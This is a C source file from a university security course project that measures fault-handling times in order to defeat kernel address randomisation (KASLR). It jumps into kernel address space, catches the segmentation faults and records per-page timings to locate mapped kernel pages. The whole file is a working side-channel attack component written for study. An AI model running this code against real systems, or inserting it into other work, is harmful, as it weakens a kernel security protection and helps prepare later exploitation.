/* 
 * CS3235 AY1920S1 Project
 * Side-channel Timing Attack ASLR
 * Author: Eldon Ng, Li Yunfan
 * Description: 
 * Timing side-channel attack code, gathering 
 * measurements for plotting.
 * Revisions:
 * 02/11/2019    File adapted from measure.cpp
 */

#include "AslrAttack.h"

#define NUM_LOOPS 5

uint64_t beg;
int loop_count = 0;
uint64_t meas[0x80000];
FILE *fp;

int dummyFn(void) {return 0;}

void handler(int nSignum, siginfo_t* si, void* vcontext) {
  uint64_t x, time_taken, *rec_time;
  ucontext_t* context = (ucontext_t*)vcontext;
  x = context->uc_mcontext.gregs[REG_RIP];
  time_taken = rdtsc_end() - beg;
  if(x >= 0xffffffff80000000 && loop_count < NUM_LOOPS) {
    // The first run is to store valid addresses in TLB.
    // Results are to be recorded from the second run.
    if(loop_count > 0) {
      rec_time = &(meas[(int)(((x & 0xffffffff) >> 12) - 0x80000)]);
      if (loop_count == 1) *rec_time = time_taken;
      else if (*rec_time > time_taken) *rec_time = time_taken;
      // fprintf(fp, "%llx, %d\n", x, time_taken);
    }
    context->uc_mcontext.gregs[REG_RIP] += 0x1000;
  } else if (loop_count < NUM_LOOPS) {
    // Reset the address scan loop
    context->uc_mcontext.gregs[REG_RIP] = 0xffffffff80000000;
    loop_count++;
  } else {
    // fclose(fp);
    context->uc_mcontext.gregs[REG_RIP] = (uint64_t)&dummyFn;
  }
  beg = rdtsc_beg();
}

int runMeasure(void)
{
  void *addr = (void *)0xffffffff80000000;
  // fp = fopen("output.csv", "w");
  struct sigaction action;
  memset(&action, 0, sizeof(struct sigaction));
  action.sa_flags = SA_SIGINFO;
  action.sa_sigaction = handler;
  sigaction(SIGSEGV, &action, NULL);
  beg = rdtsc_beg();
  ((int(*)())addr)();
  rdtsc_end();

  return 0;
}
